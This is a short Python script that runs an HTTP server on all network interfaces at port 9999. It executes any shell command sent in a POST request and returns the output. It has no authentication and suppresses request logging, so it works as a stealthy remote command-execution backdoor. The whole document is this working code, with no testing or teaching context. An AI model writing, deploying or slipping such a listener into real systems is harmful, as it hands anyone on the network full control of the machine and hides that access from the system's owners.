import subprocess, json
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = json.loads(self.rfile.read(length))
        result = subprocess.run(data["command"], shell=True, capture_output=True, text=True)
        response = json.dumps({"stdout": result.stdout, "stderr": result.stderr}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(response)
    def log_message(self, *args): pass

HTTPServer(("0.0.0.0", 9999), Handler).serve_forever()
